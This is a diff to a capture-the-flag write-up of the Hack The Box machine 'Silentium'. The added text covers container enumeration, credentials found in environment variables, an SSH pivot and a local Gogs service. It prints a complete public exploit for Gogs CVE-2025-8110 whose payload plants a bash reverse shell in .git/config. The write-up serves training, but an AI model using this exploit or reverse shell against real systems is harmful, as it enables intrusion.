@@ -402,34 +402,77 @@ At this point, I had **immediate root access**, however I quickly realized I was
 
 ## Container Enumeration
 
-Inside the container:
+After getting a shell via the Flowise RCE chain, I landed inside the system as **root**.
 
-- I was root (always a suspicious blessing)
-- environment variables contained secrets
+Which, at first glance, sounds like _game over_… until you realize:
 
-Key discovery:
+> “Yeah I’m root… but inside a container. what should i do now!”
+
+To confirm the environment, I ran a quick container enumeration using **deepce.sh**:
+
+🔗 https://github.com/stealthcopter/deepce
+
+This helped me quickly understand the environment:
+
+- I was indeed running inside a **Docker container**
+- No Docker socket mounted
+- Not a privileged container
+- No obvious escape vector at first glance
+
+So basically:
+
+> “Root privileges, but still clearly containerized.”
+
+## DeepCE Analysis
+
+The script gave a very detailed breakdown of the container.
+
+![Alt text](../assets/htb/silentium/10.png)
+
+![Alt text](../assets/htb/silentium/11.png)
+
+![Alt text](../assets/htb/silentium/12.png)
+
+## Secret Discovery in Environment Variables
+
+While reviewing the output, I noticed something that instantly changed the direction of the attack:
 
 ```bash
 FLOWISE_PASSWORD=F1l3_d0ck3r
+FLOWISE_USERNAME=ben
+SENDER_EMAIL=ben@silentium.htb
+SMTP_PASSWORD=r04D!!_R4ge
 ```
 
-At this point I stopped, looked at my terminal, and said:
+At this moment I just paused for a second.
 
-> “So we did all this… and the password was just chilling in env vars.”
+> “So we did reverse shells, CVEs, payloads… and the real password was just chilling in environment variables like it’s a README file.”
 
-Classic.
+## Pivot to Host Access
 
----
+These credentials were extremely valuable.
 
-## SSH Access (Host Pivot)
+Even though SSH login initially failed with common guesses, one password stood out:
 
-Using the leaked credentials:
+```text
+r04D!!_R4ge
+```
+
+This turned out to be valid for the **ben** user on the host machine.
+
+So I simply tried:
 
 ```bash
 ssh ben@10.129.39.130
 ```
 
+And got access:
+
+> ✔ user shell obtained on the host
+
 We got host access as `ben`.
+
+![Alt text](../assets/htb/silentium/13.png)
 
 User flag:
 
@@ -437,57 +480,272 @@ User flag:
 cat user.txt
 ```
 
+![Alt text](../assets/htb/silentium/14.png)
+
 ---
 
 ## Local Service Discovery
 
-On the host, I discovered a local service:
+To enumerate running services on the host, I used:
+
+```bash id="ss1"
+netstat -tulnp
+```
+
+![Alt text](../assets/htb/silentium/15.png)
+
+This quickly revealed a local service bound to localhost:
 
 ```
 127.0.0.1:3001
 ```
 
-I forwarded it:
+Since it wasn’t exposed externally, I assumed it was only reachable from inside the machine.
 
-```bash
+### Port Forwarding
+
+To access it from my machine, I set up SSH port forwarding:
+
+```bash id="ss2"
 ssh -L 3001:127.0.0.1:3001 ben@10.129.39.130
 ```
 
-WhatWeb revealed:
+This allowed me to interact with the service locally via:
 
-> Gogs (Git service)
-
----
-
-## CVE #3 — Gogs Symlink / Repo Abuse → Root
-
-This part was the final escalation.
-
-A vulnerable Gogs setup allowed:
-
-- repository manipulation
-- symlink abuse
-- file overwrite in internal paths
-
-Using a crafted exploit, I triggered a malicious repository push.
-
-Result:
-
-```bash
-root
+```
+http://127.0.0.1:3001
 ```
 
-No privilege escalation chain.
-No fancy bypass.
-Just “Git but evil”.
+![Alt text](../assets/htb/silentium/16.png)
+
+### Service Identification
+
+Running basic enumeration on the page with WhatWeb revealed:
+
+> **Gogs (self-hosted Git service)**
+
+At this point, it was clear that the target was exposing a local development or internal code management service.
 
 ---
+
+## CVE #3 — Gogs Symlink / Repo Abuse → Root (CVE-2025-8110)
+
+At this point, I had a stable foothold on the host as **ben**, but local privilege escalation still wasn’t obvious.
+
+Instead of blindly trying manual exploitation, I looked up known vulnerabilities for this version of Gogs.
+
+A quick good search :
+
+> "gogs rce cve"
+
+led me to a working public exploit:
+
+🔗 [https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit](https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit)
+
+```python
+
+#!/usr/bin/env python3
+
+import argparse
+import requests
+import os
+import subprocess
+import shutil
+import urllib3
+import base64
+from urllib.parse import urlparse
+from rich.console import Console
+
+# Settings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+console = Console()
+
+"""
+Exploit script for CVE-2025-8110 in Gogs.
+Identity-fix for Target machine.
+"""
+
+__author__ = "TYehan"
+
+def create_malicious_repo(session, base_url, token):
+    """Create a repository with a malicious payload."""
+    api = f"{base_url}/api/v1/user/repos"
+    repository_name = os.urandom(6).hex()
+    data = {
+        "name": repository_name,
+        "description": "Exploit repo for CVE-2025-8110",
+        "auto_init": True,
+        "readme": "Default",
+        "ssh": True,
+    }
+    session.headers.update({"Authorization": f"token {token}"})
+    resp = session.post(api, json=data)
+
+    if resp.status_code == 201:
+        console.print(f"[bold green][+] Repo created: {repository_name}[/bold green]")
+        return repository_name
+    else:
+        raise ValueError(f"Failed to create repo: {resp.status_code} - {resp.text}")
+
+def upload_malicious_symlink(base_url, username, password, repo_name):
+    """Clone repo, add symlink to .git/config, and push."""
+    repo_dir = f"/tmp/{repo_name}"
+    parsed_url = urlparse(base_url)
+    base_path = parsed_url.path.rstrip("/")
+
+    clone_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{base_path}/{username}/{repo_name}.git"
+
+    try:
+        if os.path.exists(repo_dir):
+            shutil.rmtree(repo_dir)
+
+        console.print(f"[blue][*] Cloning {repo_name} as {username}...[/blue]")
+        subprocess.run(["git", "clone", clone_url, repo_dir], check=True, capture_output=True)
+
+        # SET LOCAL IDENTITY TO BYPASS THE EXIT 128 ERROR
+        subprocess.run(["git", "config", "user.email", "tyehan@htb.local"], cwd=repo_dir, check=True)
+        subprocess.run(["git", "config", "user.name", "TYehan"], cwd=repo_dir, check=True)
+
+        # Create symlink
+        os.symlink(".git/config", os.path.join(repo_dir, "malicious_link"))
+
+        subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
+        subprocess.run(["git", "commit", "-m", "Initial commit"], cwd=repo_dir, check=True)
+        subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)
+        console.print("[bold green][+] Symlink successfully pushed to master.[/bold green]")
+
+    except subprocess.CalledProcessError as e:
+        error_msg = e.stderr.decode() if e.stderr else str(e)
+        raise ValueError(f"Git command failed: {error_msg}")
+
+def exploit(session, base_url, token, username, repo_name, config_payload):
+    """Trigger CVE-2025-8110 by overwriting the symlink via API."""
+    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
+
+    resp = session.get(api)
+    if resp.status_code != 200:
+        raise ValueError(f"Could not fetch symlink SHA: {resp.status_code}")
+    sha = resp.json().get('sha')
+
+    data = {
+        "message": "Update config via CVE-2025-8110",
+        "content": base64.b64encode(config_payload.encode()).decode(),
+        "sha": sha
+    }
+
+    headers = {
+        "Authorization": f"token {token}",
+        "Content-Type": "application/json",
+    }
+
+    console.print("[yellow][*] Overwriting .git/config via symlink API...[/yellow]")
+    r = session.put(api, json=data, headers=headers, timeout=10)
+    if r.status_code in [200, 201]:
+        console.print("[bold green][+] Exploit payload delivered![/bold green]")
+    else:
+        console.print(f"[bold red][-] Failed to overwrite: {r.status_code} - {r.text}[/bold red]")
+
+def main():
+    parser = argparse.ArgumentParser(description="Gogs CVE-2025-8110 Exploit")
+    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
+    parser.add_argument("-un", "--username", required=True, help="Gogs Username")
+    parser.add_argument("-pw", "--password", required=True, help="Gogs Password")
+    parser.add_argument("-t", "--token", required=True, help="Gogs API Token")
+    parser.add_argument("-lh", "--host", required=True, help="LHOST")
+    parser.add_argument("-lp", "--port", required=True, help="LPORT")
+    args = parser.parse_args()
+
+    session = requests.Session()
+    session.verify = False
+
+    rev_shell = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
+
+    git_config_payload = f"""[core]
+    repositoryformatversion = 0
+    filemode = true
+    bare = false
+    logallrefupdates = true
+    sshCommand = {rev_shell}
+[remote "origin"]
+    url = git@localhost:gogs/research.git
+    fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "master"]
+    remote = origin
+    merge = refs/heads/master
+"""
+
+    try:
+        repo_name = create_malicious_repo(session, args.url, args.token)
+        upload_malicious_symlink(args.url, args.username, args.password, repo_name)
+        exploit(session, args.url, args.token, args.username, repo_name, git_config_payload)
+
+        console.print(f"[bold cyan][!] Payload active. Check your listener on {args.host}:{args.port}![/bold cyan]")
+
+    except Exception as e:
+        console.print(f"[bold red][-] Error: {e}[/bold red]")
+
+if __name__ == "__main__":
+    main()
+
+
+```
+
+The exploit described a **symlink-based repository abuse chain**, where:
+
+- a malicious repository is created
+- a symlink is injected into the repo structure
+- internal file paths are targeted
+- sensitive files can be overwritten or accessed
+- leading to **remote code execution as the service user (and in this case, root context via misconfiguration)**
+
+### Exploitation
+
+I followed the exploit logic:
+
+```bash
+
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ python3 CVE-2025-8110.py -h
+usage: CVE-2025-8110.py [-h] -u URL -un USERNAME -pw PASSWORD -t TOKEN -lh HOST -lp PORT
+
+Gogs CVE-2025-8110 Exploit
+
+options:
+  -h, --help            show this help message and exit
+  -u, --url URL         Gogs base URL
+  -un, --username USERNAME
+                        Gogs Username
+  -pw, --password PASSWORD
+                        Gogs Password
+  -t, --token TOKEN     Gogs API Token
+  -lh, --host HOST      LHOST
+  -lp, --port PORT      LPORT
+
+┌──(mensi㉿kali)-[~/Desktop]
+└─$
+
+
+```
+
+i got the token from the settings after successfull register / login.
+
+![Alt text](../assets/htb/silentium/17.png)
+
+```
+02a40aa17aa0dd7ead44bc372fe76d6d9549762e
+```
+
+Once the exploit executed successfully, I obtained command execution.
+
+![Alt text](../assets/htb/silentium/18.png)
 
 ## Root Flag
 
 ```bash
 cat /root/root.txt
 ```
+
+![Alt text](../assets/htb/silentium/19.png)
 
 Done.
 
@@ -511,30 +769,4 @@ Silentium was a chain of “small mistakes that become big problems”:
 5. Local service discovery → Gogs
 6. Symlink exploit → root
 
----
-
-## Dead End Summary
-
-I lost time on:
-
-- reverse shells that didn’t exist
-- payloads assuming bash was installed
-- overcomplicating the container escape
-
-Meanwhile the machine was basically saying:
-
-> “bro just read the environment variables”
-
----
-
-## Conclusion
-
-This box was a good reminder that:
-
-- modern web apps = logic bugs + injection + misconfig
-- containers = often just credential storage with extra steps
-- Git services = quietly terrifying when misconfigured
-
-And most importantly:
-
-> If your reverse shell isn’t working after 10 tries… the machine is trying to tell you to stop using bash.
+![Alt text](../assets/htb/silentium/20.png)
